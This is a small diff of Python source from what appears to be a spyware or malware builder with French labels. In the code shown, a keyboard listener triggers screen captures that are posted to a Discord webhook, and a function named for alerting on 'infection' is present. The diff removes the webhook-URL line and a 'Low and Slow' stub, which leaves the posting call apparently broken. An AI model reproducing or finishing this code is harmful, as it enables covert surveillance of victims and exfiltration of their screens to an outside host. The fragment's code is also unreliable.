@@ -155,7 +155,6 @@ def capture_before_after_at_option_func():
         buffer = io.BytesIO()
         im.save(buffer, format="PNG")
         buffer.seek(0)
-        webhook_url = webhook_entry.get()
         files = {'file': ('screenshot.png', buffer, 'image/png')}
         message = "Screenshot envoyé"
         requests.post(webhook, json=message,files=files)
@@ -165,8 +164,6 @@ def capture_before_after_at_option_func():
     with keyboard.Listener(on_press=touche) as listener:
         listener.join()
 
-def low_and_slow_option_func():
-    messagebox.showinfo("Information", "L'option 'Low and Slow' a été sélectionnée.")
 
 def alert_on_infection_option_func():
     discord_webhook = webhook_entry.get()
